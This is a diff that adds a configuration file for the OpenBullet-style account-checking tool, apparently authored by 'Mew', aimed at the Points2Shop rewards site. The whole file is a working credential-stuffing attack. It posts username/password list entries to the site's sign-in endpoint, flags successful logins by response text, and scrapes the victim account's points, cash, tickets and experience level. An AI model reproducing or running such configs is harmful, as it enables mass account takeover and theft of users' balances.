@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "Points2Shop",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-18T07:04:00.199056+00:00",
+  "AdditionalInfo": "",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.points2shop.com/sign_in_submit" AutoRedirect=TRUE 
+  CONTENT "login=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER ":scheme: https" 
+  HEADER ":path: /sign_in_submit" 
+  HEADER ":method: POST" 
+  HEADER ":authority: www.points2shop.com" 
+KEYCHECK BanOn4XX=TRUE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Please enter correct username and/or password" 
+  KEYCHAIN Success OR 
+    KEY "You have logged in successfully" 
+PARSE "<SOURCE>" LR "\"points\": \"" "\"," Recursive=FALSE -> CAP "Points" "" "" 
+PARSE "<SOURCE>" LR "\"cash\":" "," Recursive=FALSE -> CAP "Cash" "" "" 
+PARSE "<SOURCE>" LR "\"tickets\": " "," Recursive=FALSE -> CAP "Tickets" "" "" 
+PARSE "<SOURCE>" LR "honourlevel\": \"" "\"," Recursive=FALSE -> CAP "Experience" "" "" 
